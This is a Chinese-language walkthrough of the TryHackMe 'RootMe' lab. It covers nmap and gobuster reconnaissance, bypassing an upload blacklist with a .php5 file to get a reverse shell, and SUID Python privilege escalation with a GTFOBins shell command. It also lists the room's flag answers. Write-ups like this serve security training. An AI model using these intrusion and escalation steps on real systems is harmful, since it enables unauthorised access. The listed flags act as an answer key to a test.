# rootme-tryhackme-WP

## 00x1侦察

扫描机器，有多少端口开放？  
```
nmap -Pn IP  
22/tcp open  ssh  
80/tcp open  http  
``````
答案：2  

正在运行什么版本的Apache ？  
``````
nmap -Pn -p80 -sV IP  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
``````
答案：2.4.29  

端口 22 上正在运行什么服务？  
答案：ssh  

使用 GoBuster 工具查找 Web 服务器上的目录。 
`````` 
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
/uploads              (Status: 301) [Size: 314] [--> http://IP/uploads/]  
/css                  (Status: 301) [Size: 310] [--> http://IP/css/]  
/js                   (Status: 301) [Size: 309] [--> http://IP/js/]  
/panel                (Status: 301) [Size: 312] [--> http://IP/panel/]  
``````

隐藏目录是什么？  
答案：/panel/  

## 00x2获取shell  

找到一个表单上传并获取反向shell，并找到flag。  

user.txt  
文件上传的过滤器是黑名单，.php被过滤，使用.php5可以上传  
payload是上传漏洞的payload  
拿到反shell后，使用命令find / -name "user.txt"找到user.txt  
会很长慢慢找  
大概在/var/www/文件夹下  
答案：THM{y0u_g0t_a_sh3ll}  

## 00x3权限提升

现在我们有了 shell，让我们将权限升级到 root。  

搜索有SUID权限的文件，哪个文件比较奇怪？  
使用命令find / -perm -4000  
-perm:匹配权限  
-4000:suid文件的权限  
答案：/usr/bin/python  

找到一个表格来升级您的权限。    
关键词：python，suid（主要是参考了wp，本人并不会提权）  
根据hint，去gtfobins找  

``````
苏伊德  
如果二进制文件设置了 SUID 位，则它不会放弃提升的权限，并且可能会被滥用来访问文件系统、升级或维持作为 SUID 后门的特权访问。如果它用于运行sh -p，请-p在 Debian (<= Stretch) 等允许默认shshell 以 SUID 权限运行的系统上省略该参数。  


此示例创建二进制文件的本地 SUID 副本并运行它以维护提升的权限。要与现有 SUID 二进制文件交互，请跳过第一个命令并使用其原始路径运行程序。  
sudo install -m =xs $(which python) .  
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'  
``````

直接使用命令python -c 'import os; os.execl("/bin/sh", "sh", "-p")'  
然后find / -name "root.txt"  

root.txt  
答案：THM{pr1v1l3g3_3sc4l4t10n}  

